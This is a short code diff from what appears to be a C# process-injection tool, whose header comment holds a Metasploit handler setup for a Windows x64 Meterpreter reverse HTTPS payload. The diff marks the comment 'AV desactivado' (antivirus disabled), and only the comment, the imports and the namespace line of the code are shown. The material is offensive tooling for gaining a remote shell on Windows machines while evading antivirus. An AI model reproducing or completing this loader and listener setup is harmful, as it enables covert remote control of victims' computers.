@@ -1,4 +1,4 @@
-/*
+/* AV desactivado
 > cat mrshell_x64.rc
 use multi/handler
 set payload windows/x64/meterpreter/reverse_https
@@ -11,7 +11,6 @@ set EXITONSESSION false
 
 using System;
 using System.Runtime.InteropServices;
-
 
 namespace ProcessInjection
 {
